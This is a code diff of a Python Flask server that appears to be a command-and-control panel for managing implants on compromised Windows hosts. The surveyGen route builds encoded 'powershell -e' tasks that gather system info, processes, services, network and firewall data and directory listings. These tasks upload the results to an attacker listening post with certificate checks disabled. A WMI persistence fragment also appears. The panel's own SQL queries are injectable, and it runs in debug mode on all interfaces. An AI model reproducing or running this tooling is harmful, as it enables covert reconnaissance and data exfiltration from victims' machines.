@@ -19,69 +19,44 @@ mysql = MySQL(app)
 def index():
     return redirect(url_for('implants'))
 
-@app.route('/surveyGen',methods=['GET','POST'])
+@app.route('/surveyGen',methods=['GET','POST']) #Auto generate a host survey, returns data to server, requires PS 3.0+
 def surveyGen():
     error=None
-    if request.method=='POST':
-        UUID=request.form['UUID']
+
+    if request.method=='POST':          #If POST
+        UUID=request.form['UUID']       #Grab Vars
         LP=request.form['LP']
         port=request.form['port']
-        key='0000'
+#       key='0000'                      #We will get the key later
         notes=request.form['notes']
-        try:
-            systeminfo=request.form['ssl']
-            use_ssl=True
-        except:
-            use_ssl=False
-        try:
-            systeminfo=request.form['systeminfo']
-        except:
-            systeminfo=False
-        try:
-            systeminfo=request.form['netstat']
-        except:
-            netstat=False
-        try:
-            ps=request.form['ps']
-        except:
-            ps=False
-        try:
-            svc=request.form['svc']
-        except:
-            svc=False
-        try:
-            dir_c=request.form['dir_c']
-        except:
-            dir_c=False
-        try:
-            dir_windows=request.form['dir_windows']
-        except:
-            dir_windows=False
-        try:
-            dir_system32=request.form['dir_system32']
-        except:
-            dir_system32=False
-        try:
-            dir_programfiles=request.form['dir_programfiles']
-        except:
-            dir_programfiles=False
-        try:
-            dir_x86=request.form['dir_x86']
-        except:
-            dir_x86=False
-        try:
-            netsh=request.form['netsh']
-        except:
-            netsh=False
-        try:
-            firewall=request.form['firewall']
-        except:
-            firewall=False
-        try:
-            firewall_rules=request.form['firewall_rules']
-        except:
-            firewall_rules=False
-
+        ssl, systeminfo, netstat, ps, svc, dir, dir_c, dir_windows, dir_system32, dir_programfiles, dir_x86, netsh, firewall, firewall_rules = (False,)*14
+        if "ssl" in request.form:
+            ssl=True
+        if "systeminfo" in request.form:
+            systeminfo=True
+        if "netstat" in request.form:
+            netstat=True
+        if "ps" in request.form:
+            ps=True
+        if "svc" in request.form:
+            svc=True
+        if "dir_c" in request.form:
+            dir_c=True
+        if "dir_windows" in request.form:
+            dir_windows=True
+        if "dir_system32" in request.form:
+            dir_system32=True
+        if "dir_programfiles" in request.form:
+            dir_programfiles=True
+        if "dir_x86" in request.form:
+            dir_x86=True
+        if "netsh" in request.form:
+            netsh=True
+        if "firewall" in request.form:
+            firewall=True
+        if "firewall_rules" in request.form:     #this returns to many resuts for the return and isn't implemented below
+            firewall_rules=True
+        
         cur = mysql.connection.cursor()
         get_key=cur.execute("SELECT implantkey from implants where (UUID='" + UUID + "')")
         get_key = cur.fetchall()
@@ -117,13 +92,15 @@ def surveyGen():
 #        if firewall_rules:
 #            task = task+"$message+= (get-netfirewallrule -all) | Out-String\n"
         
-        
+        address=LP + ":" + port
         task=task+ "$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n"
-        if use_ssl:
-            task=task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(Invoke-WebRequest -UseBasicParsing https://" + LP + ":" + port + " -ContentType \"application/json\" -Method POST -Body \"{ 'UUID':'" + UUID + "', 'key':'"+ key +"' , 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '"+ notes + "' }\")"
+        if ssl:
+            task=task+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.Webclient).UploadString('https://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
+            print(task)
         else:
-            task=task + "(Invoke-WebRequest -UseBasicParsing http://" + LP + ":" + port + " -ContentType \"application/json\" -Method POST -Body \"{ 'UUID':'" + UUID + "', 'key':'"+ key +"' , 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '"+ notes + "' }\")"
-        
+            task=task+"(New-Object Net.Webclient).UploadString('http://%s', \"{ 'UUID':'%s', 'key':'%s', 'event' : 'send' , 'data' : '$EncodedText' , 'details' : '%s'  }\")" % (address,UUID,key,notes)
+            print(task)
+
         encodedtask = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
         encodedtask = "powershell -e " + encodedtask
         cur = mysql.connection.cursor()
@@ -155,7 +132,6 @@ def deleteTask():
             id=request.form['ID']
             cur = mysql.connection.cursor()
             cur.execute("delete from tasks where (id="+id+")")
-            print(id)
             mysql.connection.commit()
             cur.close()
             flash('Task Deleted')
@@ -214,13 +190,14 @@ def implants():
     if  request.method == 'POST':
         cur = mysql.connection.cursor()
         UUID = request.form['UUID']
-        print(UUID)
-        implants = cur.execute("select * from allcheckins where UUID='" + UUID + "' order by calltime desc")
+        singleImplant = cur.execute("select * from implants where UUID='" + UUID +"'")
+        singleImplant = cur.fetchall()
+        implants = cur.execute("select * from checkins where UUID='" + UUID + "' order by last_checkin desc limit 100")
         implantDetails = cur.fetchall()
-        return render_template('singleimplant.html',implantDetails=implantDetails,error=error)
+        return render_template('singleimplant.html',implantDetails=implantDetails,singleImplant=singleImplant,error=error)
 
     cur = mysql.connection.cursor()
-    implants = cur.execute("select implants.UUID,implantkey, last_checkin from implants left join checkins on implants.UUID = checkins.UUID order by last_checkin desc")
+    implants = cur.execute("select t.UUID, t.last_checkin, t.gateway,t.id from checkins as t Inner join ( select UUID, max(last_checkin) as MaxDate from checkins group by UUID ) tm on t.UUID = tm.UUID and t.last_checkin = tm.MaxDate;")
     implantDetails = cur.fetchall()
     return render_template('implants.html',implantDetails=implantDetails,error=error)
 
@@ -338,4 +315,4 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
 
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host='0.0.0.0',port=5000,debug=True)
